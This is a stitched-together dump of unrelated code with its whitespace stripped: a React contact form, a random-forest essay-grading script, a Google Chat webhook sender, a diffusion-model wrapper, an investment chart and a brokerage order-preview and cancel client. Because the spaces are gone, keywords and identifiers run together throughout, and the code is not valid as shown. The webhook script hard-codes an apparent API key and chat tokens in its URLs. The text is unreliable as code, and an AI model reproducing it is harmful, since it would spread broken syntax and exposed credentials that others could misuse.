[A-Z0-9.-]+\.[A-Z]{2,4}$/i;if(values.email&&!emailRegex.test(values.email)){errors.email='Invalidemailaddress';}returnerrors;},});return(<divclassName='flexjustify-center'><formclassName='w-fullmd:w-4/5lg:w-1/2bg-whiteshadow-2xlrounded-xlpx-8pt-6pb-8mb-4'onSubmit={formik.handleSubmit}><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='name'>Name</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'type='text'id='name'name='name'onChange={formik.handleChange}value={formik.values['name']}/>{attemptedSubmit&&formik.errors['name']?(<pclassName='text-red-500italic'>{formik.errors['name']}</p>):null}</div><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='email'>Email</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'type='email'id='email'name='email'onChange={formik.handleChange}value={formik.values['email']}/>{attemptedSubmit&&formik.errors['email']?(<pclassName='text-red-500italic'>{formik.errors['email']}</p>):null}</div><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='subject'>Subject</label><inputclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outline'type='text'id='subject'name='subject'onChange={formik.handleChange}value={formik.values['subject']}/>{attemptedSubmit&&formik.errors['subject']?(<pclassName='text-red-500italic'>{formik.errors['subject']}</p>):null}</div><divclassName='mb-4'><labelclassName='blocktext-gray-700text-smfont-boldmb-2'htmlFor='body'>Body</label><textareaclassName='shadowappearance-noneborderroundedw-fullpy-2px-3text-gray-700leading-tightfocus:outline-nonefocus:shadow-outlineh-40'type='text'id='body'name='body'onChange={formik.handleChange}value={formik.values['body']}/>{attemptedSubmit&&formik.errors['body']?(<pclassName='text-red-500italic'>{formik.errors['body']}</p>):null}</div><div><buttonclassName='rounded-mdbg-gradient-to-rfrom-sky-500to-sky-400hover:from-sky-400hover:to-sky-300px-3.5py-2.5text-smfont-semiboldtext-whiteshadow-smhover:bg-indigo-500focus-visible:outlinefocus-visible:outline-2focus-visible:outline-offset-2focus-visible:outline-indigo-600'type='submit'onClick={()=>{setAttemptedSubmit(true);}}>Submit</button>{submitting&&(<pclassName='text-gray-500italicmt-2'>Processingyourrequest.Pleasewaitamoment.</p>)}</div></form></div>);};exportdefaultContactForm;#Randomforestregressionmodel(bestmodel)importpandasaspdimportnumpyasnpimportmatplotlib.pyplotaspltimportsklearnfromsklearn.ensembleimportRandomForestRegressorfromsklearn.model_selectionimporttrain_test_splitfromsklearnimportpreprocessingimportpickle#importdataandsplitintosourcedependentandpersuasive/narrative/expositorydf=pd.read_feather('essaygrader/data/dataset.feather')source=df.loc[df['SourceDependentResponses']==1]pne=df.loc[df['Persuasive/Narrative/Expository']==1]#Sourcedependentsource_ms=source.loc[source['grade']==0]source_hs=source.loc[source['grade']==1]X=source_ms[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary']]y=source_ms['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.1,random_state=0)#regressor_source_ms=RandomizedSearchCV(estimator=rf,param_distributions=random_grid,n_iter=20,cv=2,verbose=2,random_state=42,n_jobs=-1)regressor_source_ms=RandomForestRegressor(n_estimators=1000,max_depth=50,min_samples_split=10,min_samples_leaf=4,bootstrap=True)regressor_source_ms.fit(X_train,y_train)r_sq=regressor_source_ms.score(X_test,y_test)print('score-SourceDependentResponses(MiddleSchool):',r_sq)#print('Coeffs:',regressor_source_ms.coef_)filename='regressor_source_ms.sav'pickle.dump(regressor_source_ms,open(filename,'wb'))#-----X=source_hs[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary']]y=source_hs['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.1,random_state=0)#regressor_source_hs=RandomizedSearchCV(estimator=rf,param_distributions=random_grid,n_iter=100,cv=3,verbose=2,random_state=42,n_jobs=-1)regressor_source_hs=RandomForestRegressor(n_estimators=1000,max_depth=50,min_samples_split=10,min_samples_leaf=4,bootstrap=True)regressor_source_hs.fit(X_train,y_train)r_sq=regressor_source_hs.score(X_test,y_test)print('score-SourceDependentResponses(HighSchool):',r_sq)#print('Coeffs:',regressor_source_hs.coef_)filename='regressor_source_hs.sav'pickle.dump(regressor_source_hs,open(filename,'wb'))#-----#persuasive/narrative/expositorypne_ms=pne.loc[pne['grade']==0]pne_hs=pne.loc[pne['grade']==1]X=pne_ms[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary']]y=pne_ms['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.1,random_state=0)#regressor_pne_ms=RandomizedSearchCV(estimator=rf,param_distributions=random_grid,n_iter=100,cv=3,verbose=2,random_state=42,n_jobs=-1)regressor_pne_ms=RandomForestRegressor(n_estimators=1000,max_depth=50,min_samples_split=10,min_samples_leaf=4,bootstrap=True)regressor_pne_ms.fit(X_train,y_train)r_sq=regressor_pne_ms.score(X_test,y_test)print('score-Persuasive/Narrative/Expository(MiddleSchool):',r_sq)#print('Coeffs:',regressor_pne_ms.coef_)filename='regressor_pne_ms.sav'pickle.dump(regressor_pne_ms,open(filename,'wb'))#-----X=pne_hs[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words','vocabulary']]y=pne_hs['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.1,random_state=0)#regressor_pne_hs=RandomizedSearchCV(estimator=rf,param_distributions=random_grid,n_iter=100,cv=3,verbose=2,random_state=42,n_jobs=-1)regressor_pne_hs=RandomForestRegressor(n_estimators=1000,max_depth=50,min_samples_split=10,min_samples_leaf=4,bootstrap=True)regressor_pne_hs.fit(X_train,y_train)r_sq=regressor_pne_hs.score(X_test,y_test)print('score-Persuasive/Narrative/Expository(HighSchool):',r_sq)#print('Coeffs:',regressor_pne_hs.coef_)filename='regressor_pne_hs.sav'pickle.dump(regressor_pne_hs,open(filename,'wb'))fromjsonimportdumpsfromhttplib2importHttpdefsend(message):'''GoogleChatincomingwebhookquickstart.'''#url='https://chat.googleapis.com/v1/spaces/AAAA84Y0PGw/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=6Zh7XdBdJ7JB_wkD-mME6t3hDq1V1oZvtZ4KdmV5PZk'url='https://chat.googleapis.com/v1/spaces/AAAA6YRZYtA/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=F0VxpfwNeEwJ-LxUg967h4paBIOkMwTaqO2FrCrX0DA'app_message={'text':message}message_headers={'Content-Type':'application/json;charset=UTF-8'}http_obj=Http()response=http_obj.request(uri=url,method='POST',headers=message_headers,body=dumps(app_message),)if__name__=='__main__':#message='Thankyouforyourinterestasacarnivalgameoperator!Feelfreetoaskanyquestionsyoumayhave.'while(True):message=input()send(message)importtorchimporttorch.nnasnnfrompackagingimportversionOPENAIUNETWRAPPER="sgm.modules.diffusionmodules.wrappers.OpenAIWrapper"classIdentityWrapper(nn.Module):def__init__(self,diffusion_model,compile_model:bool=False):super().__init__()compile=(torch.compileif(version.parse(torch.__version__)>=version.parse("2.0.0"))andcompile_modelelselambdax:x)self.diffusion_model=compile(diffusion_model)defforward(self,*args,**kwargs):returnself.diffusion_model(*args,**kwargs)classOpenAIWrapper(IdentityWrapper):defforward(self,x:torch.Tensor,t:torch.Tensor,c:dict,**kwargs)->torch.Tensor:x=torch.cat((x,c.get("concat",torch.Tensor([]).type_as(x))),dim=1)if"cond_view"inc:returnself.diffusion_model(x,timesteps=t,context=c.get("crossattn",None),y=c.get("vector",None),cond_view=c.get("cond_view",None),cond_motion=c.get("cond_motion",None),**kwargs,)else:returnself.diffusion_model(x,timesteps=t,context=c.get("crossattn",None),y=c.get("vector",None),**kwargs,)importmatplotlib.pyplotaspltimportnumpyasnpimportseabornassnsimportmatplotlib.font_managermatplotlib.font_manager.findSystemFonts(fontpaths=None,fontext='ttf')START=0END=10INITIAL=20_000STEP=0.01SHORT=0.211298750356161TERMINAL=0.13WITHDRAW=6000#gridonsns.set_style('whitegrid')#styleonsns.set_context('talk')#setfiguresizeplt.figure(figsize=(12,8))#startx-axisat0plt.xlim(START,END)#plotequation#f(x)=20000*(1+0.211298750356161)^x{0<=x<=5}x=np.arange(START,5,STEP)y=INITIAL*(1+SHORT)**xplt.plot(x,y,color='blue',alpha=0.8)#plotdottedtransparentlineandlabel#y=52153.8461538#y=46153.8461538plt.axhline(y=52153.8461538,color='green',linestyle='--',alpha=0.5)plt.axhline(y=46153.8461538,color='green',linestyle='--',alpha=0.5)plt.text(0.5,49000,'$52,154',color='green',alpha=0.5,fontsize=24)plt.text(0.5,43000,'$46,154',color='green',alpha=0.5,fontsize=24)#labelxandyaxisplt.xlabel('Years',fontsize=18,labelpad=10,weight='bold')plt.ylabel('Value($)',fontsize=18,labelpad=10,weight='bold')#largetitleplt.title('Valueof$20,000Investment',fontsize=24,weight='bold',pad=20)#changefontsizeofticklabelsplt.xticks(fontsize=18)plt.yticks(fontsize=18)foryearinrange(5,END):x=np.arange(year,year+1,STEP)y=(52153.8461538-WITHDRAW)*(1+TERMINAL)**(x-year)plt.plot(x,y,color='blue',alpha=0.8)plt.savefig('value.png',transparent=True)plt.show()importjsonimportloggingfromlogging.handlersimportRotatingFileHandlerimportconfigparserimportrandomimportre#loadingconfigurationfileconfig=configparser.ConfigParser()config.read('config.ini')#loggersettingslogger=logging.getLogger('my_logger')logger.setLevel(logging.DEBUG)handler=RotatingFileHandler("python_client.log",maxBytes=5*1024*1024,backupCount=3)FORMAT="%(asctime)-15s%(message)s"fmt=logging.Formatter(FORMAT,datefmt='%m/%d/%Y%I:%M:%S%p')handler.setFormatter(fmt)logger.addHandler(handler)classOrder:def__init__(self,session,account,base_url):self.session=sessionself.account=accountself.base_url=base_urldefpreview_order(self):"""CallprevieworderAPIbasedonselectingfromdifferentgivenoptions:paramself:Passinauthenticatedsessionandinformationonselectedaccount"""#User'sorderselectionorder=self.user_select_order()#URLfortheAPIendpointurl=self.base_url+"/v1/accounts/"+self.account["accountIdKey"]+"/orders/preview.json"#Addparametersandheaderinformationheaders={"Content-Type":"application/xml","consumerKey":config["DEFAULT"]["CONSUMER_KEY"]}#AddpayloadforPOSTRequestpayload="""<PreviewOrderRequest><orderType>EQ</orderType><clientOrderId>{0}</clientOrderId><Order><allOrNone>false</allOrNone><priceType>{1}</priceType><orderTerm>{2}</orderTerm><marketSession>REGULAR</marketSession><stopPrice></stopPrice><limitPrice>{3}</limitPrice><Instrument><Product><securityType>EQ</securityType><symbol>{4}</symbol></Product><orderAction>{5}</orderAction><quantityType>QUANTITY</quantityType><quantity>{6}</quantity></Instrument></Order></PreviewOrderRequest>"""payload=payload.format(order["client_order_id"],order["price_type"],order["order_term"],order["limit_price"],order["symbol"],order["order_action"],order["quantity"])#MakeAPIcallforPOSTrequestresponse=self.session.post(url,header_auth=True,headers=headers,data=payload)logger.debug("RequestHeader:%s",response.request.headers)logger.debug("Requestpayload:%s",payload)#HandleandparseresponseifresponseisnotNoneandresponse.status_code==200:parsed=json.loads(response.text)logger.debug("ResponseBody:%s",json.dumps(parsed,indent=4,sort_keys=True))data=response.json()print("\nPreviewOrder:")ifdataisnotNoneand"PreviewOrderResponse"indataand"PreviewIds"indata["PreviewOrderResponse"]:forpreviewidsindata["PreviewOrderResponse"]["PreviewIds"]:print("PreviewID:"+str(previewids["previewId"]))else:#Handleerrorsdata=response.json()if'Error'indataand'message'indata["Error"]anddata["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:PreviewOrderAPIserviceerror")ifdataisnotNoneand"PreviewOrderResponse"indataand"Order"indata["PreviewOrderResponse"]:forordersindata["PreviewOrderResponse"]["Order"]:order["limitPrice"]=orders["limitPrice"]ifordersisnotNoneand"Instrument"inorders:forinstrumentinorders["Instrument"]:ifinstrumentisnotNoneand"orderAction"ininstrument:print("Action:"+instrument["orderAction"])ifinstrumentisnotNoneand"quantity"ininstrument:print("Quantity:"+str(instrument["quantity"]))ifinstrumentisnotNoneand"Product"ininstrument\and"symbol"ininstrument["Product"]:print("Symbol:"+instrument["Product"]["symbol"])ifinstrumentisnotNoneand"symbolDescription"ininstrument:print("Description:"+str(instrument["symbolDescription"]))ifordersisnotNoneand"priceType"inordersand"limitPrice"inorders:print("PriceType:"+orders["priceType"])iforders["priceType"]=="MARKET":print("Price:MKT")else:print("Price:"+str(orders["limitPrice"]))ifordersisnotNoneand"orderTerm"inorders:print("Duration:"+orders["orderTerm"])ifordersisnotNoneand"estimatedCommission"inorders:print("EstimatedCommission:"+str(orders["estimatedCommission"]))ifordersisnotNoneand"estimatedTotalAmount"inorders:print("EstimatedTotalCost:"+str(orders["estimatedTotalAmount"]))else:#Handleerrorsdata=response.json()if'Error'indataand'message'indata["Error"]anddata["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:PreviewOrderAPIserviceerror")else:#Handleerrorsdata=response.json()if'Error'indataand'message'indata["Error"]anddata["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:PreviewOrderAPIserviceerror")defprevious_order(self,session,account,prev_orders):"""CallsprevieworderAPIbasedonalistofpreviousorders:paramsession:authenticatedsession:paramaccount:informationonselectedaccount:paramprev_orders:listofinstrumentsfrompreviousorders"""ifprev_ordersisnotNone:whileTrue:#Displaypreviousinstrumentsforuserselectionprint("")count=1fororderinprev_orders:print(str(count)+")\tOrderAction:"+order["order_action"]+"|"+"SecurityType:"+str(order["security_type"])+"|"+"Term:"+str(order["order_term"])+"|"+"Quantity:"+str(order["quantity"])+"|"+"Symbol:"+order["symbol"]+"|"+"PriceType:"+order["price_type"])count=count+1print(str(count)+")\t""GoBack")options_select=input("Pleaseselectanoption:")ifoptions_select.isdigit()and0<int(options_select)<len(prev_orders)+1:#URLfortheAPIendpointurl=self.base_url+"/v1/accounts/"+account["accountIdKey"]+"/orders/preview.json"#Addparametersandheaderinformationheaders={"Content-Type":"application/xml","consumerKey":config["DEFAULT"]["CONSUMER_KEY"]}#AddpayloadforPOSTRequestpayload="""<PreviewOrderRequest><orderType>{0}</orderType><clientOrderId>{1}</clientOrderId><Order><allOrNone>false</allOrNone><priceType>{2}</priceType><orderTerm>{3}</orderTerm><marketSession>REGULAR</marketSession><stopPrice></stopPrice><limitPrice>{4}</limitPrice><Instrument><Product><securityType>{5}</securityType><symbol>{6}</symbol></Product><orderAction>{7}</orderAction><quantityType>QUANTITY</quantityType><quantity>{8}</quantity></Instrument></Order></PreviewOrderRequest>"""options_select=int(options_select)prev_orders[options_select-1]["client_order_id"]=str(random.randint(1000000000,9999999999))payload=payload.format(prev_orders[options_select-1]["order_type"],prev_orders[options_select-1]["client_order_id"],prev_orders[options_select-1]["price_type"],prev_orders[options_select-1]["order_term"],prev_orders[options_select-1]["limitPrice"],prev_orders[options_select-1]["security_type"],prev_orders[options_select-1]["symbol"],prev_orders[options_select-1]["order_action"],prev_orders[options_select-1]["quantity"])#MakeAPIcallforPOSTrequestresponse=session.post(url,header_auth=True,headers=headers,data=payload)logger.debug("RequestHeader:%s",response.request.headers)logger.debug("Requestpayload:%s",payload)#HandleandparseresponseifresponseisnotNoneandresponse.status_code==200:parsed=json.loads(response.text)logger.debug("ResponseBody:%s",json.dumps(parsed,indent=4,sort_keys=True))data=response.json()print("\nPreviewOrder:")ifdataisnotNoneand"PreviewOrderResponse"indataand"PreviewIds"indata["PreviewOrderResponse"]:forpreviewidsindata["PreviewOrderResponse"]["PreviewIds"]:print("PreviewID:"+str(previewids["previewId"]))else:#Handleerrorsdata=response.json()if'Error'indataand'message'indata["Error"]anddata["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:PreviewOrderAPIserviceerror")ifdataisnotNoneand"PreviewOrderResponse"indataand"Order"indata["PreviewOrderResponse"]:forordersindata["PreviewOrderResponse"]["Order"]:prev_orders[options_select-1]["limitPrice"]=orders["limitPrice"]ifordersisnotNoneand"Instrument"inorders:forinstrumentsinorders["Instrument"]:ifinstrumentsisnotNoneand"orderAction"ininstruments:print("Action:"+instruments["orderAction"])ifinstrumentsisnotNoneand"quantity"ininstruments:print("Quantity:"+str(instruments["quantity"]))ifinstrumentsisnotNoneand"Product"ininstruments\and"symbol"ininstruments["Product"]:print("Symbol:"+instruments["Product"]["symbol"])ifinstrumentsisnotNoneand"symbolDescription"ininstruments:print("Description:"+str(instruments["symbolDescription"]))ifordersisnotNoneand"priceType"inordersand"limitPrice"inorders:print("PriceType:"+orders["priceType"])iforders["priceType"]=="MARKET":print("Price:MKT")else:print("Price:"+str(orders["limitPrice"]))ifordersisnotNoneand"orderTerm"inorders:print("Duration:"+orders["orderTerm"])ifordersisnotNoneand"estimatedCommission"inorders:print("EstimatedCommission:"+str(orders["estimatedCommission"]))ifordersisnotNoneand"estimatedTotalAmount"inorders:print("EstimatedTotalCost:"+str(orders["estimatedTotalAmount"]))else:#Handleerrorsdata=response.json()if'Error'indataand'message'indata["Error"]anddata["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:PreviewOrderAPIserviceerror")else:#Handleerrorsdata=response.json()if'Error'indataand'message'indata["Error"]anddata["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:PreviewOrderAPIserviceerror")breakelifoptions_select.isdigit()andint(options_select)==len(prev_orders)+1:breakelse:print("UnknownOptionSelected!")@staticmethoddefprint_orders(response,status):"""Formatsanddisplaysalistoforders:paramresponse:responseobjectofalistoforders:paramstatus:orderstatusrelatedtotheresponseobject:returnalistofpreviousorders"""prev_orders=[]ifresponseisnotNoneand"OrdersResponse"inresponseand"Order"inresponse["OrdersResponse"]:fororderinresponse["OrdersResponse"]["Order"]:iforderisnotNoneand"OrderDetail"inorder:fordetailsinorder["OrderDetail"]:ifdetailsisnotNoneand"Instrument"indetails:forinstrumentindetails["Instrument"]:order_str=""order_obj={"price_type":None,"order_term":None,"order_indicator":None,"order_type":None,"security_type":None,"symbol":None,"order_action":None,"quantity":None}iforderisnotNoneand'orderType'inorder:order_obj["order_type"]=order["orderType"]iforderisnotNoneand'orderId'inorder:order_str+="Order#"+str(order["orderId"])+":"ifinstrumentisnotNoneand'Product'ininstrument\and'securityType'ininstrument["Product"]:order_str+="Type:"+instrument["Product"]["securityType"]+"|"order_obj["security_type"]=instrument["Product"]["securityType"]ifinstrumentisnotNoneand'orderAction'ininstrument:order_str+="OrderType:"+instrument["orderAction"]+"|"order_obj["order_action"]=instrument["orderAction"]ifinstrumentisnotNoneand'orderedQuantity'ininstrument:order_str+="Quantity(Exec/Entered):"+str("{:,}".format(instrument["orderedQuantity"]))+"|"order_obj["quantity"]=instrument["orderedQuantity"]ifinstrumentisnotNoneand'Product'ininstrumentand'symbol'ininstrument["Product"]:order_str+="Symbol:"+instrument["Product"]["symbol"]+"|"order_obj["symbol"]=instrument["Product"]["symbol"]ifdetailsisnotNoneand'priceType'indetails:order_str+="PriceType:"+details["priceType"]+"|"order_obj["price_type"]=details["priceType"]ifdetailsisnotNoneand'orderTerm'indetails:order_str+="Term:"+details["orderTerm"]+"|"order_obj["order_term"]=details["orderTerm"]ifdetailsisnotNoneand'limitPrice'indetails:order_str+="Price:"+str('${:,.2f}'.format(details["limitPrice"]))+"|"order_obj["limitPrice"]=details["limitPrice"]ifstatus=="Open"anddetailsisnotNoneand'netBid'indetails:order_str+="Bid:"+details["netBid"]+"|"order_obj["bid"]=details["netBid"]ifstatus=="Open"anddetailsisnotNoneand'netAsk'indetails:order_str+="Ask:"+details["netAsk"]+"|"order_obj["ask"]=details["netAsk"]ifstatus=="Open"anddetailsisnotNoneand'netPrice'indetails:order_str+="LastPrice:"+details["netPrice"]+"|"order_obj["netPrice"]=details["netPrice"]ifstatus=="indiv_fills"andinstrumentisnotNoneand'filledQuantity'ininstrument:order_str+="QuantityExecuted:"+str("{:,}".format(instrument["filledQuantity"]))+"|"order_obj["quantity"]=instrument["filledQuantity"]ifstatus!="open"andstatus!="expired"andstatus!="rejected"andinstrumentisnotNone\and"averageExecutionPrice"ininstrument:order_str+="PriceExecuted:"+str('${:,.2f}'.format(instrument["averageExecutionPrice"]))+"|"ifstatus!="expired"andstatus!="rejected"anddetailsisnotNoneand'status'indetails:order_str+="Status:"+details["status"]print(order_str)prev_orders.append(order_obj)returnprev_orders@staticmethoddefoptions_selection(options):"""Formatsanddisplaysdifferentoptionsinamenu:paramoptions:Listofoptionstodisplay:returnthenumberuserselected"""whileTrue:print("")fornum,price_typeinenumerate(options,start=1):print("{})\t{}".format(num,price_type))options_select=input("Pleaseselectanoption:")ifoptions_select.isdigit()and0<int(options_select)<len(options)+1:returnoptions_selectelse:print("UnknownOptionSelected!")defuser_select_order(self):"""Providesusersoptionstoselecttoprevieworders:paramselftest:returnuser'sorderselections"""order={"price_type":"","order_term":"","symbol":"","order_action":"","limit_price":"","quantity":""}price_type_options=["MARKET","LIMIT"]order_term_options=["GOOD_FOR_DAY","IMMEDIATE_OR_CANCEL","FILL_OR_KILL"]order_action_options=["BUY","SELL","BUY_TO_COVER","SELL_SHORT"]print("\nPriceType:")order["price_type"]=price_type_options[int(self.options_selection(price_type_options))-1]iforder["price_type"]=="MARKET":order["order_term"]="GOOD_FOR_DAY"else:print("\nOrderTerm:")order["order_term"]=order_term_options[int(self.options_selection(order_term_options))-1]order["limit_price"]=Noneiforder["price_type"]=="LIMIT":whileorder["limit_price"]isNoneornotorder["limit_price"].isdigit()\andnotre.match(r'\d+(?:[.]\d{2})?$',order["limit_price"]):order["limit_price"]=input("\nPleaseinputlimitprice:")order["client_order_id"]=random.randint(1000000000,9999999999)whileorder["symbol"]=="":order["symbol"]=input("\nPleaseenterastocksymbol:")print("\nOrderActionType:")order["order_action"]=order_action_options[int(self.options_selection(order_action_options))-1]whilenotorder["quantity"].isdigit():order["quantity"]=input("\nPleasetypequantity:")returnorderdefpreview_order_menu(self,session,account,prev_orders):"""Providesthedifferentoptionsforprevieworders:selectneworderorselectfrompreviousorder:paramsession:authenticatedsession:paramaccount:informationonselectedaccount:paramprev_orders:listofinstrumentsfrompreviousorders"""menu_list={"1":"SelectNewOrder","2":"SelectFromPreviousOrders","3":"GoBack"}whileTrue:print("")options=menu_list.keys()forentryinoptions:print(entry+")\t"+menu_list[entry])selection=input("Pleaseselectanoption:")ifselection=="1":print("\nPreviewOrder:")self.preview_order()breakelifselection=="2":self.previous_order(session,account,prev_orders)breakelifselection=="3":breakelse:print("UnknownOptionSelected!")defcancel_order(self):"""CallscancelorderAPItocancelanexistingorder:paramself:Passparameterwithauthenticatedsessionandinformationonselectedaccount"""whileTrue:#DisplayalistofOpenOrders#URLfortheAPIendpointurl=self.base_url+"/v1/accounts/"+self.account["accountIdKey"]+"/orders.json"#Addparametersandheaderinformationparams_open={"status":"OPEN"}headers={"consumerkey":config["DEFAULT"]["CONSUMER_KEY"]}#MakeAPIcallforGETrequestresponse_open=self.session.get(url,header_auth=True,params=params_open,headers=headers)logger.debug("RequestHeader:%s",response_open.request.headers)logger.debug("ResponseBody:%s",response_open.text)print("\nOpenOrders:")#Handleandparseresponseifresponse_open.status_code==204:logger.debug(response_open)print("None")menu_items={"1":"GoBack"}whileTrue:print("")options=menu_items.keys()forentryinoptions:print(entry+")\t"+menu_items[entry])selection=input("Pleaseselectanoption:")ifselection=="1":breakelse:print("UnknownOptionSelected!")breakelifresponse_open.status_code==200:parsed=json.loads(response_open.text)logger.debug(json.dumps(parsed,indent=4,sort_keys=True))data=response_open.json()order_list=[]count=1ifdataisnotNoneand"OrdersResponse"indataand"Order"indata["OrdersResponse"]:fororderindata["OrdersResponse"]["Order"]:iforderisnotNoneand"OrderDetail"inorder:fordetailsinorder["OrderDetail"]:ifdetailsisnotNoneand"Instrument"indetails:forinstrumentindetails["Instrument"]:order_str=""order_obj={"price_type":None,"order_term":None,"order_indicator":None,"order_type":None,"security_type":None,"symbol":None,"order_action":None,"quantity":None}iforderisnotNoneand'orderType'inorder:order_obj["order_type"]=order["orderType"]iforderisnotNoneand'orderId'inorder:order_str+="Order#"+str(order["orderId"])+":"ifinstrumentisnotNoneand'Product'ininstrumentand'securityType'\ininstrument["Product"]:order_str+="Type:"+instrument["Product"]["securityType"]+"|"order_obj["security_type"]=instrument["Product"]["securityType"]ifinstrumentisnotNoneand'orderAction'ininstrument:order_str+="OrderType:"+instrument["orderAction"]+"|"order_obj["order_action"]=instrument["orderAction"]ifinstrumentisnotNoneand'orderedQuantity'ininstrument:order_str+="Quantity(Exec/Entered):"+str("{:,}".format(instrument["orderedQuantity"]))+"|"order_obj["quantity"]=instrument["orderedQuantity"]ifinstrumentisnotNoneand'Product'ininstrumentand'symbol'\ininstrument["Product"]:order_str+="Symbol:"+instrument["Product"]["symbol"]+"|"order_obj["symbol"]=instrument["Product"]["symbol"]ifdetailsisnotNoneand'priceType'indetails:order_str+="PriceType:"+details["priceType"]+"|"order_obj["price_type"]=details["priceType"]ifdetailsisnotNoneand'orderTerm'indetails:order_str+="Term:"+details["orderTerm"]+"|"order_obj["order_term"]=details["orderTerm"]ifdetailsisnotNoneand'limitPrice'indetails:order_str+="Price:"+str('${:,.2f}'.format(details["limitPrice"]))+"|"order_obj["limitPrice"]=details["limitPrice"]ifinstrumentisnotNoneand'filledQuantity'ininstrument:order_str+="QuantityExecuted:"\+str("{:,}".format(instrument["filledQuantity"]))+"|"order_obj["quantity"]=instrument["filledQuantity"]ifinstrumentisnotNoneand"averageExecutionPrice"ininstrument:order_str+="PriceExecuted:"+str('${:,.2f}'.format(instrument["averageExecutionPrice"]))+"|"ifdetailsisnotNoneand'status'indetails:order_str+="Status:"+details["status"]print(str(count)+")\t"+order_str)count=1+countorder_list.append(order["orderId"])print(str(count)+")\tGoBack")selection=input("Pleaseselectanoption:")ifselection.isdigit()and0<int(selection)<len(order_list)+1:#URLfortheAPIendpointurl=self.base_url+"/v1/accounts/"+self.account["accountIdKey"]+"/orders/cancel.json"#Addparametersandheaderinformationheaders={"Content-Type":"application/xml","consumerKey":config["DEFAULT"]["CONSUMER_KEY"]}#AddpayloadforPOSTRequestpayload="""<CancelOrderRequest><orderId>{0}</orderId></CancelOrderRequest>"""payload=payload.format(order_list[int(selection)-1])#AddpayloadforPUTRequestresponse=self.session.put(url,header_auth=True,headers=headers,data=payload)logger.debug("RequestHeader:%s",response.request.headers)logger.debug("Requestpayload:%s",payload)#HandleandparseresponseifresponseisnotNoneandresponse.status_code==200:parsed=json.loads(response.text)logger.debug("ResponseBody:%s",json.dumps(parsed,indent=4,sort_keys=True))data=response.json()ifdataisnotNoneand"CancelOrderResponse"indata\and"orderId"indata["CancelOrderResponse"]:print("\nOrdernumber#"+str(data["CancelOrderResponse"]["orderId"])+"successfullyCancelled.")else:#Handleerrorslogger.debug("ResponseHeaders:%s",response.headers)logger.debug("ResponseBody:%s",response.text)data=response.json()if'Error'indataand'message'indata["Error"]\anddata["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:CancelOrderAPIserviceerror")else:#Handleerrorslogger.debug("ResponseHeaders:%s",response.headers)logger.debug("ResponseBody:%s",response.text)data=response.json()if'Error'indataand'message'indata["Error"]anddata["Error"]["message"]isnotNone:print("Error:"+data["Error"]["message"])else:print("Error:CancelOrderAPIserviceerror")breakelifselection.isdigit()andint(selection)==len(order_list)+1:breakelse:print("UnknownOptionSelected!")else:#Handleerrorslogger.debug("ResponseBody:%s",response_open.text)ifresponse_openisnotNoneandresponse_open.headers['Content-Type']=='application/json'\and"Error"inresponse_open.json()and"message"inresponse_open.json()["Error"]\andresponse_open.json()["Error"]["message"]isnotNone:print("Error:"+response_open.json()["Error"]["message"])else:print("Error:BalanceAPIserviceerror")breakelse:#Handleerrorslogger.debug("ResponseBody:%s",response_open.text)ifresponse_openisnotNoneandresponse_open.headers['Content-Type']=='application/json'\and"Error"inresponse_open.json()and"message"inresponse_open.json()["Error"]\andresponse_open.json()["Error"]["message"]isnotNone:print("Error:"+response_open.json()["Error"]["message"])else:print("Error:BalanceAPIserviceerror")breakdefview_orders(self):"""CallsordersAPItoprovidethedetailsfortheorders:paramself:Passinauthenticatedsessionandinformationonselectedaccount"""whileTrue:#URLfortheAPIendpointurl=self.base_url+"/v1/accounts/"+self.account["accountIdKey"]+"/orders.json"#Addparametersandheaderinformationheaders={"consumerkey":config["DEFAULT"]["CONSUMER_KEY"]}params_open={"status":"OPEN"}params_executed={"status":"EXECUTED"}params_indiv_fills={"status":"INDIVIDUAL_FILLS"}params_cancelled={"status":"CANCELLED"}params_rejected={"status":"REJECTED"}params_expired={"status":"EXPIRED"}#MakeAPIcallforGETrequestresponse_open=self.session.get(url,header_auth=True,params=params_open,headers=headers)response_executed=self.session.get(url,header_auth=True,params=params_executed,headers=headers)response_indiv_fills=self.session.get(url,header_auth=True,params=params_indiv_fills,headers=headers)response_cancelled=self.session.get(url,header_auth=True,params=params_cancelled,headers=headers)response_rejected=self.session.get(url,header_auth=True,params=params_rejected,headers=headers)response_expired=self.session.get(url,header_auth=True,params=params_expired,headers=headers)prev_orders=[]#Openorderslogger.debug("RequestHeader:%s",response_open.request.headers)logger.debug("ResponseBody:%s",response_open.text)print("\nOpenOrders:")#Handleandparseresponseifresponse_open.status_code==204:logger.debug(response_open)print("None")elifresponse_open.status_code==200:parsed=json.loads(response_open.text)logger.debug(json.dumps(parsed,indent=4,sort_keys=True))data=response_open.json()#Displaylistofopenordersp